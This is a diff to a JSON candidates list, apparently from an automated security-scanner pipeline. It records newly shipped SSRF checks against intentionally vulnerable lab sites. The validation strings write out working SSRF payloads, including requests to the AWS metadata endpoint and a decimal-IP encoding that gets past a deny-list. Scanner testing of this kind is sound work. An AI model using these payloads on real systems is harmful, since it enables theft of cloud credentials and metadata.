@@ -1,6 +1,24 @@
 {
   "candidates": [
     {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-basic-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://ssrf.vulnlab.dev/basic/?url=https://ssrf.vulnlab.dev/ returns Intentionally vulnerable SSRF labs in <pre class=\"body\">; ssrf.vulnlab.dev/basic findings 3→6; benchmark juice-shop-staging 12 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-metadata-aws-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://ssrf.vulnlab.dev/metadata/?url=http://169.254.169.254/latest/meta-data/ returns ami-id/iam/instance-id metadata tree; ssrf.vulnlab.dev/metadata findings 2→3+; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-blocklist-bypass-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /blocklist/?url=http://127.0.0.1/ rejected banned substring; GET /blocklist/?url=http://2852039166/latest/meta-data/ bypasses deny-list and returns ami-id; ssrf.vulnlab.dev/blocklist findings 2→4; benchmark 6/6 maintained"
+    },
+    {
       "source": "discovery:pwnshop.ctfsecurity.com",
       "slug": "pwnshop-verify-otp-bruteforce-live-oracle",
       "status": "shipped",
@@ -13654,6 +13672,21 @@
       "source": "discovery:pentest-fauxbank.vercel.app",
       "slug": "fauxbank-admin-panel-live-oracle",
       "shipped_at": "2026-07-26T10:10:00.000Z"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-basic-live-oracle",
+      "shipped_at": "2026-07-26T12:15:00.000Z"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-metadata-aws-live-oracle",
+      "shipped_at": "2026-07-26T12:15:00.000Z"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-blocklist-bypass-live-oracle",
+      "shipped_at": "2026-07-26T12:15:00.000Z"
     }
   ]
 }
